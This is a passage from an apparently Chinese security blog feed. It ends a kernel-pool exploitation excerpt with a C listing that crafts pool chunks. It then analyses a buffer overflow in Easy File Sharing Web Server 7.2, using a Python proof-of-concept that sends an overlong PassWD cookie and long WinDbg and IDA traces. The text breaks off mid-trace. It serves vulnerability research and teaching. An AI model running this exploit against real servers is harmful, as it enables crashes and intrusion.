<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># define BASE_POOL_TYPE_MASK 1</div><div class="line"># define POOL_IN_USE_MASK 2</div><div class="line"># define BLOCK_SHIFT 3 // 4 on x64</div><div class="line">VOID</div><div class="line">InitPoolChunks ( PVOID PoolAddress , USHORT BlockSize )</div><div class="line">&#123;</div><div class="line">POOL_HEADER * pool ;</div><div class="line">SLIST_ENTRY * entry ;</div><div class="line">// chunk to be freed</div><div class="line">pool = ( POOL_HEADER *) PoolAddress ;</div><div class="line">pool - &gt; PreviousSize = 0;</div><div class="line">pool - &gt; PoolIndex = 5; // out - of - bounds pool index</div><div class="line">pool - &gt; BlockSize = BlockSize ;</div><div class="line">pool - &gt; PoolType = POOL_IN_USE_MASK | ( PagedPool &amp;</div><div class="line">BASE_POOL_TYPE_MASK ) ;</div><div class="line">// last chunk on the pending frees list</div><div class="line">entry = ( SLIST_ENTRY *) (( PCHAR ) PoolAddress + sizeof (</div><div class="line">POOL_HEADER ) ) ) ;</div><div class="line">entry - &gt; Next = NULL ;</div><div class="line">// bordering chunk ( busy to avoid coalescing )</div><div class="line">pool = ( POOL_HEADER *) (( PCHAR ) PoolAddress + ( BlockSize</div><div class="line">&lt;&lt; BLOCK_SHIFT ) ) ;</div><div class="line">pool - &gt; PreviousSize = BlockSize ;</div><div class="line">pool - &gt; PoolIndex = 0;</div><div class="line">pool - &gt; BlockSize = BlockSize ;</div><div class="line">pool - &gt; PoolType = POOL_IN_USE_MASK | ( PagedPool &amp;</div><div class="line">BASE_POOL_TYPE_MASK ) ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Listing 2. Function initializing a crafted pool layout</p>
<p>原文链接地址：<a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf" target="_blank" rel="external">http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Easy File Sharing Web Server 7.2 - Buffer Overflow 分析]]></title>
      <url>http://yoursite.com/2017/07/01/Easy-File-Sharing-Web-Server-7-2-Buffer-Overflow-%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="一、漏洞环境"><a href="#一、漏洞环境" class="headerlink" title="一、漏洞环境"></a>一、漏洞环境</h2><p>exp是从<a href="https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。" target="_blank" rel="external">https://www.exploit-db.com/exploits/42261/下载来的，不过为了便于分析，修改一下。</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP Request (PassWD) Buffer Overflow (SEH)</div><div class="line"># Date: 19 June 2017</div><div class="line"># Exploit Author: clubjk</div><div class="line"># Author Contact: jk@jkcybersecurity.com</div><div class="line"># Vendor Homepage: http://www.sharing-file.com</div><div class="line"># Software Link: https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe</div><div class="line"># Version: Easy File Sharing Web Server 7.2</div><div class="line"># Tested on: WinXP SP3</div><div class="line"># Usage: ./exploit.py</div><div class="line"># [*] Connecting to Target 192.168.188.132...standby...</div><div class="line"># [*] Successfully connected to 192.168.188.132...</div><div class="line"># [*] Sending improperly formed request...</div><div class="line"># [!] Request has been sent!</div><div class="line"></div><div class="line"></div><div class="line">import socket,os,time, sys</div><div class="line"> </div><div class="line">host = &quot;127.0.0.1&quot;</div><div class="line">port = 80</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">crash = &quot;/.:/&quot;                #unusual but needed</div><div class="line">crash = &quot;A&quot;*70</div><div class="line"></div><div class="line"> </div><div class="line">request = &quot;GET /vfolder.ghp HTTP/1.1\r\n&quot;</div><div class="line">request += &quot;Host: &quot; + host + &quot;\r\n&quot;</div><div class="line">request += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Accept-Language: en-US,en;q=0.5&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Accept-Encoding: gzip, deflate&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Referer: &quot; + &quot;http://&quot; + host + &quot;/&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;Cookie: SESSIONID=16246; UserID=PassWD=&quot; + crash + &quot;; frmUserName=; frmUserPass=;&quot;</div><div class="line">request += &quot; rememberPass=202.197.208.215.201&quot;</div><div class="line">request += &quot;\r\n&quot;</div><div class="line">request += &quot;Connection: keep-alive&quot; + &quot;\r\n&quot;</div><div class="line">request += &quot;If-Modified-Since: Mon, 19 Jun 2017 17:36:03 GMT&quot; + &quot;\r\n&quot;</div><div class="line"></div><div class="line">print &quot;[*] Connecting to Target &quot; + host + &quot;...standby...&quot;</div><div class="line"></div><div class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line"></div><div class="line"></div><div class="line">try:</div><div class="line">	connect=s.connect((host, port))</div><div class="line">	print &quot;[*] Successfully connected to &quot; + host + &quot;!!!&quot;</div><div class="line">except:</div><div class="line">	print &quot;[!] &quot; + host + &quot; didn&apos;t respond\n&quot;</div><div class="line">	sys.exit(0)</div><div class="line"></div><div class="line"></div><div class="line">print &quot;[*] Sending improperly formed request...&quot;</div><div class="line">s.send(request + &quot;\r\n\r\n&quot;)</div><div class="line">print &quot;[!] Request has been sent!\n&quot;</div><div class="line">s.close()</div></pre></td></tr></table></figure></p>
<p>环境：windows xp sp3、windng</p>
<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>windbg附加软件，运行poc，捕获异常。堆栈回溯也没办法查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0:004&gt; g</div><div class="line">(c64.87c): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000000 ebx=0012b901 ecx=41414141 edx=005aae28 esi=41414141 edi=0012c740</div><div class="line">eip=0052d7aa esp=01ba6e88 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</div><div class="line">fsws+0x12d7aa:</div><div class="line">0052d7aa 8b06            mov     eax,dword ptr [esi]  ds:0023:41414141=????????</div><div class="line">0:004&gt; kv</div><div class="line">ChildEBP RetAddr  Args to Child              </div><div class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</div><div class="line">01ba7624 00000000 00000000 01ba758c 01ba75a0 fsws+0x12d7aa</div></pre></td></tr></table></figure></p>
<p>只能借助ida来分析了，跳转到异常地址，查看其所在的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:0052D7A7 ; void __thiscall sub_52D7A7(void *)</div><div class="line">.text:0052D7A7 sub_52D7A7      proc near               ; CODE XREF: sub_4013B0+2Bp</div><div class="line">.text:0052D7A7                                         ; sub_4013B0+65p ...</div><div class="line">.text:0052D7A7                 push    esi</div><div class="line">.text:0052D7A8                 mov     esi, ecx</div><div class="line">.text:0052D7AA                 mov     eax, [esi]   //esi来源于ecx</div><div class="line">                             ......</div></pre></td></tr></table></figure></p>
<p>由于这次的漏洞分析分析过程太麻烦了，我直接贴出函数的调用关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0042e920-&gt;0042a930-&gt;00412a50-&gt;0052d7a7</div></pre></td></tr></table></figure>
<p>0052d7a7这个地址所在的函数就是异常函数，关键是上层函数，对这个下个断点。然后逐步分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">0:004&gt; bp 00412A50</div><div class="line">*** WARNING: Unable to verify checksum for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">*** ERROR: Module load completed but symbols could not be loaded for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">0:004&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=01ba6e80 ebx=0012b90d ecx=01ba7624 edx=011345c1 esi=00000000 edi=0012c740</div><div class="line">eip=00412a50 esp=01ba6e7c ebp=01ba7624 iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</div><div class="line">fsws+0x12a50:</div><div class="line">00412a50 6aff            push    0FFFFFFFFh</div><div class="line">0:004&gt; dd esp</div><div class="line">01ba6e7c  0042b2ec 012f46b0 012f4740 011345c0</div><div class="line">01ba6e8c  00000000 01ba7624 0012b9d0 01ba7240</div><div class="line">01ba6e9c  00000200 012f8fac 0093003d 01133bd8</div><div class="line">01ba6eac  011345c0 0131b05c 00000000 01134520</div><div class="line">01ba6ebc  0019a8e8 005a38e8 005a38e8 01ba6e88</div><div class="line">01ba6ecc  01ba6eb0 0012b9d0 01ba6e80 01ba6e84</div><div class="line">01ba6edc  003eaf18 015a12c0 ffffff00 01134480</div><div class="line">01ba6eec  005a38e8 003e0000 01133bd8 003eaf00</div><div class="line">0:004&gt; dc 012f46b0</div><div class="line">012f46b0  73736150 413d4457 41414141 41414141  PassWD=AAAAAAAAA</div><div class="line">012f46c0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46d0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46e0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46f0  41414141 41414141 41414141 00000041  AAAAAAAAAAAAA...</div><div class="line">012f4700  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4710  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4720  00000000 00000000 00000000 00000000  ................</div><div class="line">..........  中间部分省略</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=7ffdb000 edx=005aae28 esi=00000001 edi=01ba7624</div><div class="line">eip=00413d95 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d95:</div><div class="line">00413d95 8b8c2410010000  mov     ecx,dword ptr [esp+110h] ss:0023:01ba6e70=41414141</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000001 edi=01ba7624</div><div class="line">eip=00413d9c esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9c:</div><div class="line">00413d9c 5f              pop     edi</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000001 edi=0012c740</div><div class="line">eip=00413d9d esp=01ba6d64 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9d:</div><div class="line">00413d9d 5e              pop     esi</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413d9e esp=01ba6d68 ebp=ffffffff iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9e:</div><div class="line">00413d9e 5d              pop     ebp</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413d9f esp=01ba6d6c ebp=01ba7624 iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13d9f:</div><div class="line">00413d9f 64890d00000000  mov     dword ptr fs:[0],ecx fs:003b:00000000=01ba6e70</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=00000000 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413da6 esp=01ba6d6c ebp=01ba7624 iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13da6:</div><div class="line">00413da6 5b              pop     ebx</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413da7 esp=01ba6d70 ebp=01ba7624 iopl=0         nv up ei ng nz ac pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296</div><div class="line">fsws+0x13da7:</div><div class="line">00413da7 81c40c010000    add     esp,10Ch</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00413dad esp=01ba6e7c ebp=01ba7624 iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</div><div class="line">fsws+0x13dad:</div><div class="line">00413dad c21000          ret     10h</div><div class="line">0:004&gt; p</div><div class="line">eax=00000001 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420041 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl nz na po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</div><div class="line">fsws+0x20041:</div><div class="line">00420041 2424            and     al,24h</div><div class="line">0:004&gt; p</div><div class="line">eax=00000000 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420043 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">fsws+0x20043:</div><div class="line">00420043 85c0            test    eax,eax</div><div class="line">0:004&gt; p</div><div class="line">eax=00000000 ebx=0012b90d ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420045 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">fsws+0x20045:</div><div class="line">00420045 0f94c3          sete    bl</div><div class="line">0:004&gt; p</div><div class="line">eax=00000000 ebx=0012b901 ecx=41414141 edx=005aae28 esi=00000000 edi=0012c740</div><div class="line">eip=00420048 esp=01ba6e90 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">fsws+0x20048:</div><div class="line">00420048 e85ad71000      call    fsws+0x12d7a7 (0052d7a7)</div><div class="line">0:004&gt; p</div><div class="line">(bbc.108): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000000 ebx=0012b901 ecx=41414141 edx=005aae28 esi=41414141 edi=0012c740</div><div class="line">eip=0052d7aa esp=01ba6e88 ebp=01ba7624 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</div><div class="line">fsws+0x12d7aa:</div><div class="line">0052d7aa 8b06            mov     eax,dword ptr [esi]  ds:0023:41414141=????????</div></pre></td></tr></table></figure></p>
<p>可以看到上面部分ecx来源于esp+110，然后综合esi来源于ecx，esi来源于esp+110。但是esp+110处的无效地址是怎么来的呢？<br>还是来到这个函数的关键位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div></pre></td><td class="code"><pre><div class="line">0:004&gt; bp 0412cc7</div><div class="line">*** WARNING: Unable to verify checksum for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">*** ERROR: Module load completed but symbols could not be loaded for C:\EFS Software\Easy File Sharing Web Server\fsws.exe</div><div class="line">0:004&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000013 edx=012f46b0 esi=012f46b0 edi=01ba6e30</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; dc esi</div><div class="line">012f46b0  73736150 413d4457 41414141 41414141  PassWD=AAAAAAAAA</div><div class="line">012f46c0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46d0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46e0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46f0  41414141 41414141 41414141 00000041  AAAAAAAAAAAAA...</div><div class="line">012f4700  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4710  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4720  00000000 00000000 00000000 00000000  ................</div><div class="line">0:004&gt; dc edi</div><div class="line">01ba6e30  7c80be80 ffffffff 7c80be76 0052dc3f  ...|....v..|?.R.</div><div class="line">01ba6e40  011343e0 01ba6eac 00522d39 ffffffff  .C...n..9-R.....</div><div class="line">01ba6e50  0012c740 00000000 0012b90d 01ba6e8c  @............n..</div><div class="line">01ba6e60  01ba6eac 00000000 00000008 0052d537  .n..........7.R.</div><div class="line">01ba6e70  01ba718c 0054f033 00000009 0042b2ec  .q..3.T.......B.</div><div class="line">01ba6e80  012f46b0 012f4740 011347a0 00000000  .F/.@G/..G......</div><div class="line">01ba6e90  01ba7624 0012b9d0 01ba7240 00000200  $v......@r......</div><div class="line">01ba6ea0  012f8fac 0093003d 01133bd8 011343e0  ../.=....;...C..</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000012 edx=012f46b0 esi=012f46b4 edi=01ba6e34</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; dc esi</div><div class="line">012f46b4  413d4457 41414141 41414141 41414141  WD=AAAAAAAAAAAAA</div><div class="line">012f46c4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46d4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46e4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46f4  41414141 41414141 00000041 00000000  AAAAAAAAA.......</div><div class="line">012f4704  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4714  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4724  00000000 00000000 00000000 00000000  ................</div><div class="line">0:004&gt; dc edi</div><div class="line">01ba6e34  ffffffff 7c80be76 0052dc3f 011343e0  ....v..|?.R..C..</div><div class="line">01ba6e44  01ba6eac 00522d39 ffffffff 0012c740  .n..9-R.....@...</div><div class="line">01ba6e54  00000000 0012b90d 01ba6e8c 01ba6eac  .........n...n..</div><div class="line">01ba6e64  00000000 00000008 0052d537 01ba718c  ........7.R..q..</div><div class="line">01ba6e74  0054f033 00000009 0042b2ec 012f46b0  3.T.......B..F/.</div><div class="line">01ba6e84  012f4740 011347a0 00000000 01ba7624  @G/..G......$v..</div><div class="line">01ba6e94  0012b9d0 01ba7240 00000200 012f8fac  ....@r......../.</div><div class="line">01ba6ea4  0093003d 01133bd8 011343e0 0131b05c  =....;...C..\.1.</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000011 edx=012f46b0 esi=012f46b8 edi=01ba6e38</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000010 edx=012f46b0 esi=012f46bc edi=01ba6e3c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000f edx=012f46b0 esi=012f46c0 edi=01ba6e40</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000e edx=012f46b0 esi=012f46c4 edi=01ba6e44</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div 